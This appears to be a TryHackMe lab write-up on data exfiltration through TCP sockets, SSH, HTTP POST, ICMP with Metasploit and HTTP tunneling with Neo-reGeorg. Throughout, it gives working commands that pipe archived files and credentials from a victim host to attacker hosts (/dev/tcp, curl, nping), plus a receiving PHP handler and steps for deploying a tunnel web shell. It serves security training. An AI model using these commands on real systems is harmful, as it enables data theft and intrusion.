# Data Exfiltration

## How to use Data Exfiltration
#### Traditional Data Exfiltration
#### C2 Communications
#### Tunneling

## Traditional Data Exfiltration
![exfiltration](https://github.com/nkn-ctrl/TryHackMe/assets/73976100/4b08c31e-0867-49a9-913c-558386ada8a4)  

### Exfiltration using TCP socket

<img src="https://github.com/nkn-ctrl/TryHackMe/assets/73976100/3ef38151-35ff-4e52-9933-f1deaca27a2b" width=600>  

1. The first machine is listening over TCP on port 1337
2. The other machine connects to the port specified in step 1. For example, nc 1.2.3.4 1337
3. The first machine establishes the connection
4. Finally, the sending and receiving data starts. For example, the attacker sends commands and receives results.  

- Listening on port TCP/8080 in the JumpBox
```
thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)
```
- Exfiltrate Data over TCP Socket from the victim machine!
```
thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/[JUMP_BOX_IP]/8080
0+1 records in
0+1 records out
260 bytes copied, 9.8717e-05 s, 2.6 MB/s
```  
- Restoring the tar file
```
thm@jump-box$ cd /tmp/
thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
0+1 records in
0+1 records out
260 bytes transferred in 0.000321 secs (810192 bytes/sec)
```

### Exfiltration using SSH
- Exfiltration data from the victim1 machine
```
thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

## C2 Communications
![exfiltrarion2](https://github.com/nkn-ctrl/TryHackMe/assets/73976100/f32ff963-384a-4d9a-8ebb-91bf35fdc5e1)  

### Exfiltrate using HTTP(S)
#### HTTP Data Exfiltration
1. An attacker sets up a web server with a data handler. In our case, it will be `web.thm.com` and the `contact.php` page as a data handler.
2. A C2 agent or an attacker sends the data. In our case, we will send data using the `curl` command.
3. The webserver receives the data and stores it. In our case, the `contact.php` receives the POST request and stores it into `/tmp`.
4. The attacker logs into the webserver to have a copy of the received data.  

First, we prepared a webserver with a data handler for this task. The following code snapshot is of PHP code to handle POST requests via a file parameter and stores the received data in the `/tmp` directory as `http.bs64` file name.   

```
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```  

- Sending POST data via CURL
```
thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
```
- Checking the received data and fix it
```
thm@web:~$ ls -l /tmp/
total 4
-rw-r--r-- 1 www-data www-data 247 Apr 12 16:03 http.bs64
thm@web:~$ cat /tmp/http.bs64
H4sIAAAAAAAAA 3ROw7CMBBFUddZhVcA/sYSHUuJSAoKMLKNYPkkgSriU1kIcU/hGcsuZvTysEtD<
WYua1Ch4P9fRss69dsZ4E6wNTiitlTdC qpTPZxz6ZKUIsVY3v379P6j8j3/8ejzqlyrrDgF3Dr3
On/XLvI3QVshVY1hlv48/64/7I bU5fzJaa 2c5XbazzbTOtvCkxpubbUwIAAAAAAAAAAAAAAAB4
5gZKZxgrACgAAA==

thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64

thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
tmp/task6/
tmp/task6/creds.txt
```
#### ICMP Data Exflitration
![icmp1](https://github.com/nkn-ctrl/TryHackMe/assets/73976100/c6648109-b53a-4d1d-a030-758c8d2e3f32)  

- Set the BPF_FILTER in MSF  
```
msf5 > use auxiliary/server/icmp_exfil
msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP
BPF_FILTER => icmp and not src ATTACKBOX_IP
```  
- Set the interface in MSF  
```
msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
INTERFACE => eth0
msf5 auxiliary(server/icmp_exfil) > run
    
[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
```  
The [nping](https://nmap.org/nping/) tool, an open-source tool for network packet generation, response analysis, and response time measurement. The NPING tool is part of the NMAP suite tools.  
- Sending the Trigger Value from the Victim  
```
thm@jump-box$ ssh thm@icmp.thm.com
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
SENT (0.0369s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=7785 seq=1] IP [ttl=64 id=40595 iplen=39 ]
RCVD (0.0376s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=63 id=12656 iplen=39 ]
RCVD (0.0755s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=31 id=60759 iplen=32 ]
    
Max rtt: 38.577ms | Min rtt: 0.636ms | Avg rtt: 19.606ms
Raw packets sent: 1 (39B) | Rcvd: 2 (71B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds
```  
- Sending the Data and the End of the File Trigger Value  
```
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
SENT (0.0312s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=14633 seq=1] IP [ttl=64 id=13497 iplen=42 ]
RCVD (0.0328s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=63 id=17031 iplen=42 ]
RCVD (0.0703s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=31 id=41138 iplen=30 ]
    
Max rtt: 39.127ms | Min rtt: 1.589ms | Avg rtt: 20.358ms
Raw packets sent: 1 (42B) | Rcvd: 2 (72B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds 
    
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin2:password2"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
SENT (0.0354s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=39051 seq=1] IP [ttl=64 id=32661 iplen=44 ]
RCVD (0.0358s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=63 id=18581 iplen=44 ]
RCVD (0.0748s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=31 id=2149 iplen=30 ]
    
Max rtt: 39.312ms | Min rtt: 0.371ms | Avg rtt: 19.841ms
Raw packets sent: 1 (44B) | Rcvd: 2 (74B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds 
    
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
SENT (0.0364s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=33619 seq=1] IP [ttl=64 id=51488 iplen=31 ]
RCVD (0.0369s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=63 id=19671 iplen=31 ]
RCVD (0.3760s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=31 id=1003 iplen=36 ]
    
Max rtt: 339.555ms | Min rtt: 0.391ms | Avg rtt: 169.973ms
Raw packets sent: 1 (31B) | Rcvd: 2 (67B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds
thm@icmp-host:~#
```  
- Receiving Data in MSF  
```
msf5 auxiliary(server/icmp_exfil) > run
    
[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
[+] Beginning capture of "file.txt" data
[*] 30 bytes of data received in total
[+] End of File received. Saving "file.txt" to loot
[+] Incoming file "file.txt" saved to loot
[+] Loot filename: /root/.msf4/loot/20220425212408_default_ATTACKBOX_IP_icmp_exfil_838825.txt
```


### Tunneling
![exfiltration3](https://github.com/nkn-ctrl/TryHackMe/assets/73976100/21509d65-0b22-458e-ae64-6ae96c31c3df)

#### HTTP Tunneling  

<img src="https://github.com/nkn-ctrl/TryHackMe/assets/73976100/2840f366-f6ee-424e-8264-8f858c64cbb3" width=600>  

For HTTP Tunneling, we will be using a [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) tool to establish a communication channel to access the internal network devices.   

- Generating encrypted Tunneling Clients with a selected password!  
```
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm
~~~
~~~
    [+] Mkdir a directory: neoreg_servers
    [+] Create neoreg server files:
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel_compatibility.jsp
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel_compatibility.jspx
       => neoreg_servers/tunnel.php
```  

The previous command generates encrypted Tunneling clients with `thm` key in the `neoreg_servers/` directory.  In our scenario, we will be uploading the `tunnel.php` file via the uploader machine. 

- Creating an HTTP Tunnel
```
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://UPLOADER_IP/uploader/files/tunnel.php
```
- Access the app.thm.com machine via the HTTP Tunneling
```
root@AttackBox:~$ curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
Welcome to APP Server!
```  

